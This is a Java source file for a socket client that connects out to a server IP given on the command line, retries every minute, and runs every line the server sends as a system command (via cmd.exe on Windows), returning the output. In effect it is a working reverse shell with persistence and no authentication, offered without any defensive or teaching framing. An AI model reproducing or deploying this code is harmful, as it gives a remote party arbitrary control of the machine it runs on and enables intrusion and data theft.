import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;


public class SocketClientWindows{

	private static final int PORT = 5001;
	private static String ipAddress; 
	BufferedReader in;
	private static boolean serverDiss;
	PrintWriter out;

	public static void main(String[] args) throws Exception{			
		ipAddress = args[0];
		SocketClientWindows client = new SocketClientWindows();
		do{
			serverDiss = false;
			client.connect();
		}while(serverDiss);
	
	}
	
	private void connect() throws IOException {
		try{
		Socket socket = null;
		while(socket== null){
			try{
				socket = new Socket(ipAddress ,PORT);
			}catch(IOException e){
				System.out.println("No Server found...");
				try{
					Thread.sleep(60*1000);
				}catch(InterruptedException ex){
					System.out.println(ex);
				}
			}
		}
		System.out.println("Connected to a new server");
		in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		out = new PrintWriter(socket.getOutputStream(), true);
		String command;
		while(true){
			command = in.readLine();
			if(command.equals("stop")){
				
				break;
			}
			if(command != null){
				System.out.println(command);
				if(!command.contains("Welcome")){
					out.println(executeCommand(command));
				}
			}
		}
		out.println("exit");
		socket.close();
		}catch(IOException e){
			serverDiss = true;
			System.out.println("Server has disconnected...");
		}
	}
	
	private String executeCommand(String command) {
	
		StringBuffer output = new StringBuffer();
		
		try {
			String os = System.getProperty("os.name");
			ProcessBuilder builder;
			if(os.toLowerCase().contains("window")){
				builder = new ProcessBuilder("cmd.exe", "/c", command);
			}else{
				builder = new ProcessBuilder(command);
			}
			builder.redirectErrorStream(true);
			Process p = builder.start();
			BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
			BufferedReader errorStream = new BufferedReader(new InputStreamReader(p.getErrorStream()));
			String line;
			while ((line = inputStream.readLine()) != null) {
				output.append(line+"\n");
			}
			while((line = errorStream.readLine()) != null){
				output.append(line+"\n");
			}
		} catch (Exception e) {
			System.out.println(e);
		}
		
		
		return output.toString();
 
	}

}


